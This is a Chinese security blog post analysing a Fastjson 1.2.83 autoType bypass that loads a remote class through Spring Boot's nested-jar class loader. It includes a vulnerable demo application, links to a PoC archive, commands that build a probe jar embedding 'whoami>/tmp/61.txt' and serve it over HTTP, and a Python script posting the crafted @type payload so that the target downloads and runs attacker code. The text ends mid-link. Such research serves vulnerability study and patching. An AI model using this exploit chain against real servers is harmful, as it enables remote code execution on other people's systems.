---
title: Fastjson 1.2.83 漏洞分析
url: https://www.o2oxy.cn/4515.html
source: print("")
date: 2026-07-21
fetch_date: 2026-07-22T05:02:56.753249
---

# Fastjson 1.2.83 漏洞分析

![print("")](https://www.o2oxy.cn/wp-content/themes/JieStyle-Two/images/avatar.jpg)

### print("")

* [Home](http://www.o2oxy.cn)
* [信息安全](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8)
* [WEB前端](https://www.o2oxy.cn/category/web%E5%89%8D%E7%AB%AF)
* [linux](https://www.o2oxy.cn/category/linux)
* [python](https://www.o2oxy.cn/category/%E6%95%B0%E6%8D%AE%E5%BA%93)
* [监控](https://www.o2oxy.cn/category/%E7%9B%91%E6%8E%A7)
* [生活](https://www.o2oxy.cn/category/%E7%94%9F%E6%B4%BB)
* [Java学习](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8/java)
* [宝塔面板最新活动](https://www.bt.cn/huodong)
* [Author](https://www.o2oxy.cn/tags)

# Fastjson 1.2.83 漏洞分析

作者: print("")
分类: [WEB安全](https://www.o2oxy.cn/category/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8)
发布时间: 2026-07-21 23:43
阅读次数: 73 次

# 1. 核⼼原理

### 1.1 漏洞⼊⼝：fastjson 的 @type 处理

fastjson 解析 JSON 时，如果遇到 {“@type”:”类名”} ，会尝试加载这个类并把 JSON 字段映射到类的属性。这个机制叫 autoType。

fastjson 1.2.83 默认关闭了 autoType（防⿊名单绕过），但留下了⼀个注解扫描 @JSONType

### 1.2 @JSONType 扫描路径的缺陷

[![](https://www.o2oxy.cn/wp-content/uploads/2026/07/1.png)](https://www.o2oxy.cn/wp-content/uploads/2026/07/1.png)

核心点就是去扫描传递的这个typeName 通过解析类。如果这个类解析成功然后去扫描有没有@JSONType 注解  。如果有这个注解。那么就给JsonType 设置true

后续的判断如下：

```
                            if (autoTypeSupport || jsonType || expectClassFlag) {
                                boolean cacheClass = autoTypeSupport || jsonType;
                                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, cacheClass);
                            }
```

那么这里就不需要autoType检查

这里需要注意的一个点就是

```
String resource = typeName.replace('.', '/') + ".class";
```

这里是使用了替换。使用. 替换了/

例如：传递了 com.bt.cn.xxx 那么就会替换成com/bt/cn/xxx

### 1.3 LaunchedURLClassLoader 加载机制

Spring Boot我们在打包成jar的时候运行这个jar命令是 java -jar xxx.jar 这个是运行命令
Spring Boot 打包出来的 Jar 与普通 Java Jar 并不相同
查看打包后的 Jar 可以发现，其内部结构如下：

```
META-INF/
BOOT-INF/
 ├── classes/
 └── lib/
```

• BOOT-INF/classes：项目编译后的 Class

• BOOT-INF/lib：所有第三方依赖 Jar

• META-INF/MANIFEST.MF：Jar 清单文件

[![](https://www.o2oxy.cn/wp-content/uploads/2026/07/2.png)](https://www.o2oxy.cn/wp-content/uploads/2026/07/2.png)

MANIFEST.MF文件内容介绍

```
Manifest-Version: 1.0
Spring-Boot-Classpath-Index: BOOT-INF/classpath.idx
Implementation-Title: demo
Implementation-Version: 0.0.1-SNAPSHOT
Spring-Boot-Layers-Index: BOOT-INF/layers.idx
Start-Class: com.example.demo.DemoApplication
Spring-Boot-Classes: BOOT-INF/classes/
Spring-Boot-Lib: BOOT-INF/lib/
Build-Jdk-Spec: 1.8
Spring-Boot-Version: 2.7.18
Created-By: Maven JAR Plugin 3.2.2
Main-Class: org.springframework.boot.loader.JarLauncher

```

看一下文件内容，他指向了org.springframework.boot.loader.JarLauncher

这里说明：

执行

```
java -jar xxxx
```

启动的是

```
org.springframework.boot.loader.JarLauncher
```

启动的操作如下：

```
    public static void main(String[] args) throws Exception {
        (new JarLauncher()).launch(args);
    }
```

跟进这个类查看到底做了什么操作

[![](https://www.o2oxy.cn/wp-content/uploads/2026/07/3.png)](https://www.o2oxy.cn/wp-content/uploads/2026/07/3.png)

Spring Boot 会创建一个 自定义类加载器：

```
LaunchedURLClassLoader
```

它会：

• 加载 BOOT-INF/classes

• 加载 BOOT-INF/lib

• 将它们组合成一个统一的 ClassLoader

• 设置为当前线程的 ContextClassLoader

• 最后再执行：

```
Application.main()
```

LaunchedURLClassLoader  支持jar的格式嵌套。

那么可以使用

```
jar:http://192.168.1.10/probe!/POC.classl
```

进行加载class 类。但是有一个问题。就是Fastjson 中 typeName.replace(‘.’, ‘/’) + “.class”;  替换。

那么可以采用IP 地址的十进制整数格式
 例如 192.168.1.72 十进制格式就是3232235848  然后// 可以使用..

那么

```
jar:http://192.168.1.72:9998/probe!/foo/Exception
```

就变成了

```
jar:http:..3232235848:9998.probe!.foo.Exception
```

# 2. 环境测试

### 2.1 环境搭建

随便来一个pom.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.18</version>
        <relativePath/>
    </parent>
    <groupId>com.example</groupId>
    <artifactId>demo</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>demo</name>
    <description>demo</description>

    <properties>
        <java.version>8</java.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.83</version>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-devtools</artifactId>
            <scope>runtime</scope>
            <optional>true</optional>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```

简单的接口

```
package com.example.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import com.alibaba.fastjson.parser.ParserConfig;

import java.util.LinkedHashMap;
import java.util.Map;

@RestController
public class FastJsonController {

    @PostMapping("/fastjson")
    public JSONObject parseJson(@RequestBody String body) {
        JSONObject json = JSON.parseObject(body);
        return json;
    }

    @PostMapping(value = "/parse", produces = MediaType.APPLICATION_JSON_VALUE)
    @ResponseBody
    public Map<String, Object> parse(@RequestBody String payload) {
        Map<String, Object> r = new LinkedHashMap<>();
        ClassLoader original = Thread.currentThread().getContextClassLoader();
        try {
            Thread.currentThread().setContextClassLoader(ParserConfig.class.getClassLoader());
            Object obj = JSON.parse(payload);
            r.put("ok", true);
            r.put("class", obj == null ? "null" : obj.getClass().getName());
            r.put("result", String.valueOf(obj));
        } catch (Throwable e) {
            r.put("ok", false);
            r.put("error", e.getClass().getName() + ": " + e.getMessage());
        } finally {
            Thread.currentThread().setContextClassLoader(original);
        }
        return r;
    }
}
```

编译打包一下就好了。

如果觉得麻烦 直接下载 <https://www.o2oxy.cn/wp-content/uploads/2026/07/demo-0.0.1-SNAPSHOT.zip>

然后直接java -jar 启动即可。（JDK8 ）

### 2.2 HTTP 的方式

<https://www.o2oxy.cn/wp-content/uploads/2026/07/poc.zip>

```
unzip poc.zip
javac -cp "poc/lib/*" -d poc poc/GenProbe.java
java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 192.168.1.72 9998 "whoami>/tmp/61.txt"
cd poc/www/
python3 -m http.server 9998
```

利用的脚本

```
import requests,json
import struct,socket
from concurrent.futures import ThreadPoolExecutor, as_completed

def ip_to_int(ip):
    return struct.unpack("!I", socket.inet_aton(ip))[0]

ip_int="192.168.1.72"
lport="9998"
url="http://192.168.1.72:9991/parse"

# ── Step 1: 发送探针请求，触发 JAR 下载 ──
probe ={"@type":"jar:http:..3232235848:9998.probe!.POC","x":1}
print("[*] Probe:", probe)
r = requests.post(url, json=probe, timeout=10)
print("[*] Probe response:", r.json())
```

[![](https://www.o2oxy.cn/wp-content/uploads/2026/07/4.png)](https://www.o2oxy.cn/wp-content/uploa...